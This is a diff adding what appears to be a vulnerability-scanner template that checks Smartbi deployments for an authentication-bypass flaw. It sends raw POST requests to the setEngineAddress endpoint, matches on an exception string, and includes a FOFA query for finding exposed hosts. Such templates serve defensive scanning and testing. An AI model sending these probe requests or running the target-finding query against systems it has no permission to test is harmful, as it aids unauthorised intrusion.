@@ -1,0 +1,34 @@
+id: smartbi-auth-bypass
+
+info:
+  name: smartbi - Auth bypass
+  author: leadlife
+  severity: high
+  description: Smartbi auth bypass.
+  reference:
+    - https://mp.weixin.qq.com/s/qwTzdnncx1rsswX04uFxCQ
+  metadata:
+    verified: true
+    fofa-query: app="Smartbi"|| body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+  tags: smartbi,unauth
+
+http:
+  - raw:
+      - |
+        POST /smartbi/smartbix/api/monitor/setEngineAddress HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=isLogged&params=[]
+
+      - |
+        POST /smartbix/api/monitor/setEngineAddress HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=isLogged&params=[]
+    matchers:
+      - type: word
+        words:
+          - 'smartbix.SmartbiXException'
+        part: body
